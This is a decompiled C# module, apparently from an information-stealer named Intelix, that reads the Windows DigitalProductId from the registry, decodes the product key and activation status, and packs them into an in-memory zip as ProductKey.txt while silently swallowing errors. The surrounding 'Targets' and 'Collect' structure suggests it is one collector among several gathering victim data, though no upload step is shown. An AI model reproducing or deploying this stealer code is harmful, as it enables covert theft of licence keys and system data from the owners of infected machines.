using System;
using System.Collections;
using System.Text;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Device
{
	// Token: 0x02000031 RID: 49
	public class ProductKey : ITarget
	{
		// Token: 0x0600008B RID: 139 RVA: 0x00006CC0 File Offset: 0x00004EC0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			try
			{
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
				RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
				object obj = (registryKey2 != null) ? registryKey2.GetValue("DigitalProductId") : null;
				bool flag = obj != null;
				if (flag)
				{
					byte[] digitalProductId = (byte[])obj;
					registryKey.Close();
					bool flag2 = (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2) || Environment.OSVersion.Version.Major > 6;
					string windowsProductKeyFromDigitalProductId = this.GetWindowsProductKeyFromDigitalProductId(digitalProductId, flag2 ? ProductKey.DigitalProductIdVersion.Windows8AndUp : ProductKey.DigitalProductIdVersion.UpToWindows7);
					bool flag3 = !string.IsNullOrEmpty(windowsProductKeyFromDigitalProductId);
					if (flag3)
					{
						string str = ProductKey.IsWindowsActivatedFast() ? "Activated ✅" : "Not Activated ❌";
						StringBuilder stringBuilder = new StringBuilder();
						stringBuilder.AppendLine("=== Windows Product Key Info ===");
						stringBuilder.AppendLine("Status : " + str);
						stringBuilder.AppendLine("Key    : " + windowsProductKeyFromDigitalProductId);
						stringBuilder.AppendLine("================================");
						zip.AddTextFile("ProductKey.txt", stringBuilder.ToString());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00006E18 File Offset: 0x00005018
		private string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
		{
			string text = string.Empty;
			byte b = (byte)(digitalProductId[66] / 6 & 1);
			digitalProductId[66] = (byte)((digitalProductId[66] & 247) | (b & 2) * 4);
			int num = 0;
			for (int i = 24; i >= 0; i--)
			{
				int num2 = 0;
				for (int j = 14; j >= 0; j--)
				{
					num2 *= 256;
					num2 = (int)digitalProductId[j + 52] + num2;
					digitalProductId[j + 52] = (byte)(num2 / 24);
					num2 %= 24;
					num = num2;
				}
				text = "BCDFGHJKMPQRTVWXY2346789"[num2].ToString() + text;
			}
			string str = text.Substring(1, num);
			string str2 = text.Substring(num + 1, text.Length - (num + 1));
			text = str + "N" + str2;
			for (int k = 5; k < text.Length; k += 6)
			{
				text = text.Insert(k, "-");
			}
			return text;
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00006F30 File Offset: 0x00005130
		private string DecodeProductKey(byte[] digitalProductId)
		{
			char[] array = new char[]
			{
				'B',
				'C',
				'D',
				'F',
				'G',
				'H',
				'J',
				'K',
				'M',
				'P',
				'Q',
				'R',
				'T',
				'V',
				'W',
				'X',
				'Y',
				'2',
				'3',
				'4',
				'6',
				'7',
				'8',
				'9'
			};
			char[] array2 = new char[29];
			ArrayList arrayList = new ArrayList();
			for (int i = 52; i <= 67; i++)
			{
				arrayList.Add(digitalProductId[i]);
			}
			for (int j = 28; j >= 0; j--)
			{
				bool flag = (j + 1) % 6 == 0;
				if (flag)
				{
					array2[j] = '-';
				}
				else
				{
					int num = 0;
					for (int k = 14; k >= 0; k--)
					{
						int num2 = num << 8 | (int)((byte)arrayList[k]);
						arrayList[k] = (byte)(num2 / 24);
						num = num2 % 24;
						array2[j] = array[num];
					}
				}
			}
			return new string(array2);
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00007024 File Offset: 0x00005224
		private string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, ProductKey.DigitalProductIdVersion digitalProductIdVersion)
		{
			bool flag = digitalProductIdVersion != ProductKey.DigitalProductIdVersion.Windows8AndUp;
			string result;
			if (flag)
			{
				result = this.DecodeProductKey(digitalProductId);
			}
			else
			{
				result = this.DecodeProductKeyWin8AndUp(digitalProductId);
			}
			return result;
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00007054 File Offset: 0x00005254
		public static bool IsWindowsActivatedFast()
		{
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform"))
				{
					bool flag = registryKey != null;
					if (flag)
					{
						object value = registryKey.GetValue("BackupProductKeyDefault");
						return value != null && value.ToString().Length > 0;
					}
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x020000A7 RID: 167
		private enum DigitalProductIdVersion
		{
			// Token: 0x040000FF RID: 255
			UpToWindows7,
			// Token: 0x04000100 RID: 256
			Windows8AndUp
		}
	}
}
